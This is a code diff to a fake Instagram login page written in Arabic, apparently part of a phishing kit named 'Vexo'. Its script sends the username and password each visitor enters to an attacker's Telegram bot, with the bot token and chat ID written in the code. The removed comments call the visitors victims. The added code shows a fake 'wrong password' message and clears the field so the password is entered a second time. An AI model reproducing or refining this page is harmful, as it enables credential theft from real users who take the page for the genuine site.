@@ -68,8 +68,12 @@
             margin-top: 8px;
         }
 
-        .btn-login:active {
-            opacity: 0.7;
+        /* رسالة الخطأ الوهمية */
+        #error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 15px 0;
+            display: none; /* مخفية افتراضياً */
         }
 
         .divider {
@@ -99,12 +103,6 @@
             text-decoration: none;
             display: block;
             margin-bottom: 15px;
-        }
-
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
         }
 
         .signup-container {
@@ -144,6 +142,8 @@
                 <input type="password" id="password" placeholder="كلمة السر" required>
             </div>
             <button type="submit" class="btn-login">تسجيل الدخول</button>
+            
+            <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.</div>
         </form>
 
         <div class="divider">
@@ -152,16 +152,14 @@
             <div></div>
         </div>
 
-        <a href="#" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
-        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        <a href="https://www.facebook.com/login" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
     </div>
 
     <div class="signup-container">
-        ليس لديك حساب؟ <a href="#">اشترك</a>
+        ليس لديك حساب؟ <a href="https://www.instagram.com/accounts/emailsignup/">اشترك الآن</a>
     </div>
 
     <script>
-        // بيانات البوت الخاصة بك
         const token = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
         const chatId = '7822309283';
 
@@ -170,21 +168,17 @@
 
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error-msg');
 
-            // نص الرسالة الذي سيصلك في تليجرام
-            const message = `⚠️ ضحية جديدة من مشروع Vexo:\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}`;
-
+            // إرسال البيانات لتليجرام
+            const message = `⚠️ محاولة دخول جديدة:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            fetch(url)
-            .then(response => {
-                // توجيه الضحية للموقع الحقيقي بعد سرقة البيانات للتمويه
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // حتى في حال الخطأ نوجهه للتمويه
-                window.location.href = "https://www.instagram.com/";
+            fetch(url).then(() => {
+                // إظهار رسالة الخطأ بدلاً من التحويل للموقع الحقيقي
+                errorDiv.style.display = 'block';
+                // مسح حقل كلمة السر ليجبره على الإدخال مجدداً
+                document.getElementById('password').value = '';
             });
         });
     </script>
